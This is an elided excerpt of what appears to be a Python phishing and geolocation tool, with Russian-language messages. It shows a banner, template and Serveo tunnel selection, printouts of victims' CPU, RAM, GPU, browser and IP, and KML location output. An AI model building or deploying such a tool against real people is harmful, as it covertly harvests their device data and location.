...
def banner():
	print (R +
	r'''
 ██████╗    _     ███╗   ███╗UU      UU _ __  __ _  III
██╔════╝   / \    ████╗ ████║UU      UU| '__|/ _` | 
╚█████╗   / _ \   ██╔████╔██║UU      UU| |  | (_| | III	 
 ╚═══██╗ / ___ \  ██║╚██╔╝██║UUU    UUU|_|   \__,_| III
██████╔╝/ /   \ \ ██║ ╚═╝ ██║ UUU  UUU              III
╚═════╝/_/     \_\╚═╝     ╚═╝  UUUUUU                III ''' + R)
	print('\n' + G + '[>]' + C + ' Создатель : ' + W + 'SAMURAI')
	...
	try:
		...
		if ver_sc == 200:
			...
			if version == github_ver:
				print(C + '[' + G + ' Установлено ' + C +']' + '\n')
			else:
				print(C + '[' + G + ' Доступный : {} '.format(github_ver) + C + ']' + '\n')
		else:
...
def tunnel_select():
	if tunnel_mode == None:
		...
		print(G + '[+]' + C + ' Пропуская Serveo, запустите собственный туннельный сервис вручную...' + W + '\n')
	else:
...
def template_select():
	...
	print('\n' + G + '[+]' + C + ' Загрузка {} Шаблон...'.format(templ_json['templates'][selected]['name']) + W)
...
def serveo():
	...
	print(G + '[+]' + C + ' Получение URL-адреса Serveo...' + W + '\n')
	if subdom is None:
	...
	try:
		...
		with open (info, 'r') as file2:
			...
			for value in json3['dev']:
				...
				print(G + '[+]' + C + ' CPU Ядра  : ' + W + var_cores)
				print(G + '[+]' + C + ' Оперативка        : ' + W + var_ram)
				print(G + '[+]' + C + ' Производитель GPU : ' + W + var_vendor)
				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
				print(G + '[+]' + C + ' Разрешение : ' + W + var_res)
				print(G + '[+]' + C + ' Браузер    : ' + W + var_browser)
				print(R + '[+]' + C + ' IP  : ' + W + var_ip)
...
def kmlout(var_lat, var_lon):
	...
	print(G + '[+]' + C + ' KML-файл создаётся..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
